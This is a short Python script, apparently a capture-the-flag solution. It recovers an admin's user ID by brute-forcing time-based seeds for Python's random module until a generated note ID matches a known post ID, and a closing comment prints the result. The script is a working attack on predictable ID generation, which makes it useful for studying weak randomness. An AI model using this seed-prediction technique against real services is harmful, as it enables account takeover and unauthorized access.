#!/usr/bin/python3

import string, random, time
from datetime import datetime, timezone


# Admin
post_id = 'lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u'


alphabet = list(string.ascii_lowercase + string.digits)

def get_random_id():
    return ''.join([random.choice(alphabet) for _ in range(32)])

def bruteforce():
    timestamp = 1610677740
    while timestamp < 1610677740 + 60:
        timestamp = round(timestamp, 4)
        random.seed(timestamp)
        user_id = get_random_id()
        post_at = datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
        random.seed(user_id + post_at)
        note_id = get_random_id()
        if note_id == post_id:
            print(timestamp)
            print("Found user_id", user_id)
            return
        timestamp += 0.0001


bruteforce()
# Found user_id 7bdeij4oiafjdypqyrl2znwk7w9lulgn